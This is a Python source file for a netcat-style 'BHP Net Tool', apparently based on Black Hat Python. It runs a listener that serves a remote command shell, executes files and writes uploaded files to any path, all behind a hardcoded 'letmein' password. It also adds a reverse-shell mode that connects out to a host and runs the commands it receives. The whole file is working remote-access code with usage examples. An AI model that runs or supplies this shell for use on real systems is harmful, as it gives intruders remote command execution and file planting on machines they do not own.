import sys
import socket
import getopt
import threading
import subprocess

# Global variables
listen = False
command = False
upload = False
execute = ""
target = ""
upload_destination = ""
port = 0
reverse = False  # new flag for reverse shell

# Authentication password (change as needed)
auth_password = b"letmein"

def usage():
    print("BHP Net Tool")
    print("")
    print("Usage: bhpnet.py -t target_host -p port")
    print("-l --listen                    - listen on [host]:[port] for incoming connections")
    print("-e --execute=file_to_run      - execute the given file upon receiving a connection")
    print("-c --command                  - initialize a command shell")
    print("-u --upload=destination       - upon receiving connection upload a file and write to [destination]")
    print("--reverse                     - reverse shell back to the target")
    print("")
    print("Examples:")
    print("bhpnet.py -t 192.168.0.1 -p 5555 -l -c")
    print("bhpnet.py -t 192.168.0.1 -p 5555 -l -u=c:\\target.exe")
    print("echo 'ABC' | bhpnet.py -t 192.168.0.1 -p 135")
    print("bhpnet.py --reverse -t 192.168.0.1 -p 4444")
    sys.exit(0)

def run_command(command):
    command = command.strip()
    try:
        output = subprocess.check_output(command, stderr=subprocess.STDOUT, shell=True)
    except:
        output = b"Failed to execute command.\r\n"
    return output

def client_sender(buffer):
    client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    try:
        client.connect((target, port))
        if len(buffer):
            client.send(buffer.encode())
        while True:
            response = b""
            while True:
                data = client.recv(4096)
                response += data
                if len(data) < 4096:
                    break
            print(response.decode(), end="")
            buffer = input("")
            buffer += "\n"
            client.send(buffer.encode())
    except Exception as e:
        print(f"[*] Exception! Exiting: {e}")
        client.close()

def reverse_shell(target_host, target_port):
    client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    try:
        client.connect((target_host, target_port))
        while True:
            client.send(b"<ReverseShell:#> ")
            cmd = client.recv(1024).decode().strip()
            if cmd.lower() == "exit":
                break
            output = subprocess.getoutput(cmd)
            client.send(output.encode() + b"\n")
    except:
        client.close()

def client_handler(client_socket):
    global upload
    global execute
    global command

    # Step 1: Authenticate
    client_socket.send(b"Password: ")
    password = client_socket.recv(1024).strip()

    if password != auth_password:
        client_socket.send(b"Access Denied.\n")
        client_socket.close()
        return

    # Upload file handling
    if upload_destination:
        file_buffer = b""
        while True:
            data = client_socket.recv(1024)
            if not data:
                break
            file_buffer += data
        try:
            with open(upload_destination, "wb") as f:
                f.write(file_buffer)
            client_socket.send(f"Successfully saved file to {upload_destination}\r\n".encode())
        except:
            client_socket.send(f"Failed to save file to {upload_destination}\r\n".encode())

    # Execute command if specified
    if execute:
        output = run_command(execute)
        client_socket.send(output)

    # Launch command shell if requested
    if command:
        while True:
            client_socket.send(b"<BHP:#> ")
            cmd_buffer = b""
            while b"\n" not in cmd_buffer:
                cmd_buffer += client_socket.recv(1024)
            response = run_command(cmd_buffer.decode())
            client_socket.send(response)

def server_loop():
    global target
    if not target:
        target = "0.0.0.0"
    server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server.bind((target, port))
    server.listen(5)
    while True:
        client_socket, addr = server.accept()
        client_thread = threading.Thread(target=client_handler, args=(client_socket,))
        client_thread.start()

def main():
    global listen, port, execute, command, upload_destination, target, reverse

    if not len(sys.argv[1:]):
        usage()

    try:
        opts, args = getopt.getopt(sys.argv[1:], "hle:t:p:cu:", ["help", "listen", "execute=", "target=", "port=", "command", "upload=", "reverse"])
    except getopt.GetoptError as err:
        print(str(err))
        usage()

    for o, a in opts:
        if o in ("-h", "--help"):
            usage()
        elif o in ("-l", "--listen"):
            listen = True
        elif o in ("-e", "--execute"):
            execute = a
        elif o in ("-c", "--command"):
            command = True
        elif o in ("-u", "--upload"):
            upload_destination = a
        elif o in ("-t", "--target"):
            target = a
        elif o in ("-p", "--port"):
            port = int(a)
        elif o == "--reverse":
            reverse = True
        else:
            assert False, "Unhandled Option"

    if reverse and target and port > 0:
        reverse_shell(target, port)

    if not listen and target and port > 0:
        buffer = sys.stdin.read()
        client_sender(buffer)

    if listen:
        server_loop()

if __name__ == "__main__":
    main()
